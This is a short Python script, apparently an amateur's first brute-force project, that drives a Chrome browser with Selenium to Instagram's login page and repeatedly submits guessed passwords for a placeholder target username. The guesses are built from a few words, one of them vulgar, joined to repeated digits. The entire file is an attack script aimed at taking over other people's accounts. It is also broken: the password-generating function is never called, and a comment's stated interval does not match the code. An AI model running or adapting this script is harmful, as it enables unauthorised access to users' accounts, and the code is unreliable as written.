import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time


# Main function | generates random passwords containing basic characters and whole numbers |


# my first brute force project

def Brutalisk():
    global randForce
    array = [1,2,3,
            4,5,6,
            7,8,9,
            11,22,33,
            44,55,66,
            77,88,99,
            111,222,
            333,444,
            555,666,
            777,888,
            999,000]
    
    words = ["password","pussy","weed"]

    
    randArray = random.choice(array)
    randWord = random.choice(words)
    randForce = randWord + str(randArray)
    

   # for int in range(0,1):
    #        print(randForce)
# What does this block do?
# loads target to brute force 
def BruteForce():
    target = "ENTER_YOUR_TARGET_HERE"
    driver = webdriver.Chrome(r'C:\Users\natha\Documents\chromedriver_win32\chromedriver.exe')
    driver.get("https://www.instagram.com/")
    login_button = driver.find_element_by_xpath("//a[@href='/accounts/login/?source=auth_switcher']")
    login_button.click()
    time.sleep(5)
    user_name_elem = driver.find_element_by_xpath("//input[@name='username']")
    time.sleep(3)
    user_name_elem.clear()
    time.sleep(2)
    user_name_elem.send_keys(target)
    time.sleep(3)
    passworword_elem = driver.find_element_by_xpath("//input[@name='password']")
    time.sleep(3)
    passworword_elem.clear()
    time.sleep(2)
    passworword_elem.send_keys(randForce)
    time.sleep(3)
    passworword_elem.send_keys(Keys.RETURN)
    time.sleep(5)
    

# main loop
# What does this block do?
# calls the Target function every 120 seconds until the user kills the task


while True:
    BruteForce()
    time.sleep(60)
  